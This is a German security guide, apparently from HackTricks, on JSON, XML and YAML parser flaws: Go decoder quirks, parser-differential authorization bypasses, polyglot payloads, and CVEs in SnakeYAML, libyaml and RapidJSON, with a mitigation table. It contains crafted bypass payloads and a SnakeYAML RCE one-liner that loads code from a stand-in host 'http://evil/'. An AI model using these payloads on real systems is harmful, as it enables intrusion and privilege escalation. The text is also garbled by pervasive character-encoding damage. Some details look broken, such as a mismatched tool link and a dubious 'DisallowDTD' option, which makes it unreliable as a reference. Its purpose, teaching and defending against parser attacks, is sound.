# JSON, XML & Yaml Hacking & Issues

{{#include ../banners/hacktricks-training.md}}

## Go JSON Decoder

Die folgenden Probleme wurden im Go JSON festgestellt, obwohl sie auch in anderen Sprachen vorhanden sein k√∂nnten. Diese Probleme wurden in [**diesem Blogbeitrag**](https://blog.trailofbits.com/2025/06/17/unexpected-security-footguns-in-gos-parsers/) ver√∂ffentlicht.

Go‚Äôs JSON-, XML- und YAML-Parser haben eine lange Liste von Inkonsistenzen und unsicheren Standardeinstellungen, die ausgenutzt werden k√∂nnen, um **Authentifizierung zu umgehen**, **Berechtigungen zu eskalieren** oder **sensible Daten zu exfiltrieren**.

### (Un)Marshaling Unerwarteter Daten

Das Ziel ist es, Strukturen auszunutzen, die es einem Angreifer erm√∂glichen, sensible Felder zu lesen/schreiben (z. B. `IsAdmin`, `Password`).

- Beispielstruktur:
```go
type User struct {
Username string `json:"username,omitempty"`
Password string `json:"password,omitempty"`
IsAdmin  bool   `json:"-"`
}
```
- H√§ufige Schwachstellen

1. **Fehlendes Tag** (kein Tag = Feld wird standardm√§√üig weiterhin geparst):
```go
type User struct {
Username string
}
```
Nutzlast:
```json
{"Username": "admin"}
```
2. **Falsche Verwendung von `-`**:
```go
type User struct {
IsAdmin bool `json:"-,omitempty"` // ‚ùå wrong
}
```
Nutzlast:
```json
{"-": true}
```
‚úîÔ∏è Richtige Methode, um ein Feld vom (De)Serialisieren abzuhalten:
```go
type User struct {
IsAdmin bool `json:"-"`
}
```
### Parser-Differenzen

Das Ziel ist es, die Autorisierung zu umgehen, indem man ausnutzt, wie verschiedene Parser dasselbe Payload unterschiedlich interpretieren, wie zum Beispiel:
- CVE-2017-12635: Apache CouchDB Umgehung √ºber doppelte Schl√ºssel
- 2022: Zoom 0-Klick RCE √ºber XML-Parser-Inkonsistenz
- GitLab 2025 SAML-Umgehung √ºber XML-Eigenheiten

**1. Doppelte Felder:**
Go's `encoding/json` nimmt das **letzte** Feld.
```go
json.Unmarshal([]byte(`{"action":"UserAction", "action":"AdminAction"}`), &req)
fmt.Println(req.Action) // AdminAction
```
Andere Parser (z. B. Javas Jackson) k√∂nnen die **erste** nehmen.

**2. Gro√ü-/Kleinschreibung:**
Go ist nicht case-sensitiv:
```go
json.Unmarshal([]byte(`{"AcTiOn":"AdminAction"}`), &req)
// matches `Action` field
```
Sogar Unicode-Tricks funktionieren:
```go
json.Unmarshal([]byte(`{"a‚Ñ™tion≈ø": "bypass"}`), &req)
```
**3. Cross-Service-Mismatch:**
Stellen Sie sich vor:
- Proxy, geschrieben in Go
- AuthZ-Dienst, geschrieben in Python

Angreifer sendet:
```json
{
"action": "UserAction",
"AcTiOn": "AdminAction"
}
```
- Python sieht `UserAction`, erlaubt es
- Go sieht `AdminAction`, f√ºhrt es aus


### Datenformatverwirrung (Polyglots)

Das Ziel ist es, Systeme auszunutzen, die Formate (JSON/XML/YAML) mischen oder bei Parserfehlern offen bleiben, wie z.B.:
- **CVE-2020-16250**: HashiCorp Vault analysierte JSON mit einem XML-Parser, nachdem STS JSON anstelle von XML zur√ºckgegeben hatte.

Angreifer kontrolliert:
- Den `Accept: application/json` Header
- Teilweise Kontrolle des JSON-K√∂rpers

Der XML-Parser von Go analysierte es **trotzdem** und vertraute der injizierten Identit√§t.

- Ausgekl√ºgelte Payload:
```json
{
"action": "Action_1",
"AcTiOn": "Action_2",
"ignored": "<?xml version=\"1.0\"?><Action>Action_3</Action>"
}
```
- **Go JSON** Parser: `Action_2` (nicht gro√ü-/kleinschreibungsempfindlich + letzter gewinnt)
- **YAML** Parser: `Action_1` (gro√ü-/kleinschreibungsempfindlich)
- **XML** Parser: parst `"Action_3"` innerhalb des Strings

---

## Bemerkenswerte Parser-Sicherheitsanf√§lligkeiten (2023-2025)

> Die folgenden √∂ffentlich ausnutzbaren Probleme zeigen, dass unsicheres Parsen ein Problem in mehreren Sprachen ist ‚Äì nicht nur ein Go-Problem.

### SnakeYAML Deserialisierung RCE (CVE-2022-1471)

* Betroffen: `org.yaml:snakeyaml` < **2.0** (verwendet von Spring-Boot, Jenkins usw.).
* Grundursache: `new Constructor()` deserialisiert **willk√ºrliche Java-Klassen**, was Gadget-Ketten erm√∂glicht, die in der Ausf√ºhrung von Remote-Code enden.
* One-Liner PoC (√∂ffnet den Rechner auf dem anf√§lligen Host):
```yaml
!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL ["http://evil/"] ] ] ]
```
* Fix / Minderung:
1. **Upgrade auf ‚â•2.0** (verwendet standardm√§√üig `SafeLoader`).
2. Bei √§lteren Versionen explizit `new Yaml(new SafeConstructor())` verwenden.

### libyaml Double-Free (CVE-2024-35325)

* Betroffen: `libyaml` ‚â§0.2.5 (C-Bibliothek, die von vielen Sprachbindungen genutzt wird).
* Problem: Das zweimalige Aufrufen von `yaml_event_delete()` f√ºhrt zu einem Double-Free, den Angreifer in DoS oder in einigen Szenarien in Heap-Ausnutzung umwandeln k√∂nnen.
* Status: Vom Upstream als ‚ÄûAPI-Missbrauch‚Äú abgelehnt, aber Linux-Distributionen haben das gepatchte **0.2.6** ausgeliefert, das den Zeiger defensiv null-freigibt.

### RapidJSON Integer (Unter|√úber)-lauf (CVE-2024-38517 / CVE-2024-39684)

* Betroffen: Tencent **RapidJSON** vor dem Commit `8269bc2` (<1.1.0-patch-22).
* Fehler: In `GenericReader::ParseNumber()` l√§sst nicht √ºberpr√ºfte Arithmetik Angreifern zu, riesige numerische Literale zu erstellen, die sich umwickeln und den Heap besch√§digen ‚Äî was letztendlich eine Privilegieneskalation erm√∂glicht, wenn der resultierende Objektgraph f√ºr Autorisierungsentscheidungen verwendet wird.

---

### üîê Minderung (Aktualisiert)

| Risiko                               | Fix / Empfehlung                                         |
|--------------------------------------|---------------------------------------------------------|
| Unbekannte Felder (JSON)            | `decoder.DisallowUnknownFields()`                       |
| Duplizierte Felder (JSON)           | ‚ùå Kein Fix in der stdlib ‚Äî validieren mit [`jsoncheck`](https://github.com/dvsekhvalnov/johnny-five) |
| Gro√ü-/Kleinschreibung-unabh√§ngige √úbereinstimmung (Go) | ‚ùå Kein Fix ‚Äî validieren Sie Struktur-Tags + vor-kanonicalisieren Sie Eingaben |
| XML-Garbagedaten / XXE              | Verwenden Sie einen geh√§rteten Parser (`encoding/xml` + `DisallowDTD`) |
| YAML unbekannte Schl√ºssel            | `yaml.KnownFields(true)`                                |
| **Unsichere YAML-Desserialisierung** | Verwenden Sie SafeConstructor / Upgrade auf SnakeYAML ‚â•2.0 |
| libyaml ‚â§0.2.5 Double-Free          | Upgrade auf **0.2.6** oder distro-gepatchte Version    |
| RapidJSON <gepatchter Commit        | Kompilieren Sie gegen die neueste RapidJSON (‚â•Juli 2024) |

## Referenzen

- Baeldung ‚Äì ‚ÄûBehebung von CVE-2022-1471 mit SnakeYAML 2.0‚Äú
- Ubuntu Security Tracker ‚Äì CVE-2024-35325 (libyaml)

{{#include ../banners/hacktricks-training.md}}
